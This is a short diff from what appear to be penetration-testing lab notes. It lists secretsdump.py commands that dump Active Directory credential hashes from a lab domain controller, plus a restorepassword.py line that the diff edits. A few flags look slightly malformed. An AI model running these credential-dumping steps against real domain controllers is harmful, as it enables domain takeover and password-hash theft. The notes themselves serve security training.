@@ -22,7 +22,7 @@ $secretsdump.py -just -dc MARVEL/HYDRA-DC\$@192.168.138.132
 
 $secretsdump.py ADMINISTRATOR@192.168.138.132 -HASHES (FIND THE HASH USING ABOVE CMD)
 
-$python3 restorepassword.py  MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.138.132
+$python3 restorepassword.py  MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.138.132 -hexpass hash
 
 --------------------------------------------------------------------------------------
 
